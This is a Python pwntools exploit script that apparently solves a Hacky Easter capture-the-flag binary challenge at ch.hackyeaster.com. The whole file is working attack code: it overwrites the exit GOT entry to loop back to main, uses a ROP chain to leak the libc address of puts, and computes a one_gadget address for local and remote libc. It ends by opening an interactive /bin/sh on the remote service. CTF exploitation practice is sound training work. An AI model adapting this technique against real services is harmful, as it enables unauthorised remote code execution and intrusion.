#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host ch.hackyeaster.com --port 2315 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'ch.hackyeaster.com'
port = int(args.PORT or 2315)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def rop_inputs(target_addr, target_val, chain):
    assert target_val < 0x3FFFFFFFFFFFFFFF
    # target_val = target_val - target_addr - 6
    inputs = [0,0,0,0,0,0]
    inputs[5] = target_addr
    for i in range(len(chain)):
        inputs[i] = chain[i]
    tmp = (target_val * 6 - sum(inputs)) // (6 - len(chain))
    for i in range(len(chain),4):
        inputs[i] = tmp
    inputs[4] = (target_val * 6 - sum(inputs)) 
    # print(inputs)
    for v in inputs:
        print(v, hex(v), str(v).encode('ascii'))
    print(f'sum: {sum(inputs)//6:x}, target_val: {target_val:x}')
    # assert (sum(inputs) // 6) == target_val
    return inputs

io = start()

# some important constraints for ROP
rop_ret = 0x400933
rop_pop_rdi_ret = 0x400932
rop_harmless = 0x601000

# first redirect exit to call main again
# but because of stack alignment issues, do it via 
# 0x400932 (pop rdi; ret) and then leave 0x40094b 
# in input[0]
target_addr = exe.got['exit']
target_val = rop_pop_rdi_ret
inputs = rop_inputs(target_addr, target_val,[exe.symbols['main']])
log.info(io.recvuntil(b'input\n').decode('ascii'))
for v in inputs:
    io.sendline(str(v).encode('ascii'))


# define first rop to leak address of puts
log.info(f'main: {exe.symbols["main"]:x}')
log.info(f'puts: {exe.symbols["puts"]:x} - puts.got: {exe.got["puts"]:x}')
log.info(f'exit: {exe.symbols["exit"]:x} - exit.got: {exe.got["exit"]:x}')


# because of stack alignment issues, we just send it to somewhere where it
# cannot cause any harm
chain=[rop_ret, rop_pop_rdi_ret,
       exe.got['puts'], exe.symbols['puts'],
       exe.symbols['main'], rop_harmless]

log.info(io.recvuntil(b'input\n').decode('ascii'))
for v in chain:
    io.sendline(str(v).encode('ascii'))
tmp = io.recvuntil(b"\n").rstrip()
leaked_addr_puts_libc = u64(tmp.ljust(8, b"\x00")[:8])
log.info(f'Leaked server\'s libc address, puts(): {leaked_addr_puts_libc:x}')

if args.LOCAL:
    """
    symbols from the local libc (identified from leaked addresses):

    root@hlzar❯ one_gadget /usr/lib/x86_64-linux-gnu/libc.so.6                           
    0x4bfe0 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
    constraints:
      rsp & 0xf == 0
      rcx == NULL
      rbx == NULL || (u16)[rbx] == NULL

    0xf2532 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
    constraints:
      [rsp+0x70] == NULL
      [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL
      [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

    0xf253a posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, r9)
    constraints:
      [rsp+0x70] == NULL
      [r9] == NULL || r9 == NULL
      [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

    0xf253f posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
    constraints:
      [rsp+0x70] == NULL
      [r9] == NULL || r9 == NULL
      rdx == NULL || (s32)[rdx+0x4] <= 0
    """
    libc_path = '/usr/lib/x86_64-linux-gnu/libc.so.6'
    gadget = 0x4bfe0
    gadget = 0xf2532
    gadget = 0xf253a
else:
    """
    symbols from the remote libc (identified from leaked addresses):

    root@hlzar❯ one_gadget ./libc6_2.27-3ubuntu1.6_amd64.so                              
    0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      rsp & 0xf == 0
      rcx == NULL

    0x4f302 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL

    0x10a2fc execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    """
    libc_path = './libc6_2.27-3ubuntu1.6_amd64.so'
    gadget = 0x4f2a5
    gadget = 0x10a2fc
    gadget = 0x4f302

libc = context.binary = ELF(libc_path)
addr_puts = libc.symbols['puts']
addr_gadget = gadget - addr_puts + leaked_addr_puts_libc

# now call execve from the ROP
chain =[addr_gadget, 1, 1, 1, 1, rop_harmless]

log.info(io.recvuntil(b'input\n').decode('ascii'))
for v in chain:
    print(v, hex(v), str(v).encode('ascii'))
    io.sendline(str(v).encode('ascii'))
io.interactive()


